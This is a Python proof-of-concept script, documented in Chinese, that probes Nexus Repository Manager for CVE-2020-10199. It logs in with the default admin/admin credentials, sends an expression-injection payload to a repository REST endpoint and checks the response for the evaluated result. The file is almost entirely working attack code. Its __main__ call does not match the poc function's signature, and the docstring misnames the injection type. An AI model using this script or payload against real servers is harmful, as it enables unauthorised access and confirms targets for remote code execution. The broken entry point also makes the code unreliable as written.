#!/usr/bin/python3
# -*- coding:utf-8 -*-
"""
Nexus Repository Manager CVE-2020-10199 POC 检测脚本

漏洞描述：
Nexus Repository Manager 3.x 存在 OGNL 表达式注入漏洞。
攻击者可以通过构造恶意的请求来执行任意代码。

影响版本：
- Nexus Repository Manager 3.21.1 及以下版本

检测原理：
通过向 /service/rest/beta/repositories/go/group 端点发送包含
OGNL 表达式的恶意请求。如果服务器返回计算结果，则说明存在漏洞。

使用方法：
    python cve_2020_10199_poc.py
    或在代码中调用 poc(url) 函数

参数说明：
    url: 目标URL，如 http://127.0.0.1:8081
    timeout: 请求超时时间（秒），默认10秒

返回值：
    (True, '存在漏洞') - 检测到漏洞
    (False, '安全') - 未检测到漏洞
    (False, '扫描失败 - 错误信息') - 扫描过程中出现错误

注意：
    此POC仅用于安全测试和授权的渗透测试，请勿用于非法用途。
"""

import base64
import requests
import json

csrf = "0.15080630880112578"

def get_sessionid(ip, port, password):
    """
    获取 Nexus 会话 ID
    
    Args:
        ip: 目标IP地址
        port: 目标端口号
        password: 登录密码
    
    Returns:
        str: 会话 ID
    """
    url = "http://" + ip + ":" + port
    login_url = url + "/service/rapture/session" # 登录url
    head = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = {'username': str(base64.b64encode("admin".encode('utf-8')))[2:-1], 'password': str(base64.b64encode(password.encode('utf-8')))[2:-1]}
    print(payload)
    resp = requests.request("post", login_url, data=payload, headers=head).headers
    return resp['Set-Cookie'].split(";")[0].split('=')[1]

def poc(url, timeout=10):
    """
    检测目标是否存在 Nexus CVE-2020-10199 漏洞
    
    Args:
        url: 目标URL，如 http://127.0.0.1:8081
        timeout: 请求超时时间（秒），默认10秒
    
    Returns:
        tuple: (是否存在漏洞, 结果消息)
    """
    from urllib.parse import urlparse
    parsed = urlparse(url)
    ip = parsed.hostname or parsed.netloc.split(':')[0]
    port = parsed.port or (8081 if parsed.scheme == 'http' else None)
    password = "admin"
    
    target_url = "http://" + ip + ":" + str(port)
    try:
        sessionid = get_sessionid(ip, str(port), password)
        print(sessionid)
        headers = {
            "Host": "%s:%s" % (ip, port),
            "Referer": target_url,
            "X-Nexus-UI": "true",
            "X-Requested-With": "XMLHttpRequest",
            "NX-ANTI-CSRF-TOKEN": csrf,
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
            "Cookie": "NX-ANTI-CSRF-TOKEN=%s; NXSESSIONID=%s" % (csrf, sessionid),
            "Origin": target_url,
            "Connection": "close"
            }
        vulurl = target_url + "/service/rest/beta/repositories/go/group"
        payload = {"name": "internal", "online": "true", "storage": {"blobStoreName": "default", "strictContentTypeValidation": "true"}, "group": {"memberNames": ["$\\A{233*233}"]}}
        r = requests.post(vulurl, data=json.dumps(payload), headers=headers, timeout=timeout)
        if "A54289" in r.text:
            print ("[+] CVE-2020-10199 vulnerability exists. exp as https://github.com/zhzyker/exphub")
            return True, 'Nexus CVE-2020-10199: 存在漏洞'
        else:
            print ("[-] CVE-2020-10199 vulnerability does not exist.")
            return False, 'Nexus CVE-2020-10199: 安全'
    except Exception as e:
        return False, f'Nexus CVE-2020-10199: 扫描失败 - {str(e)}'

if __name__ == "__main__":
    ip = "127.0.0.1"
    port="8081"
    password="admin"
    poc(ip, port, password)
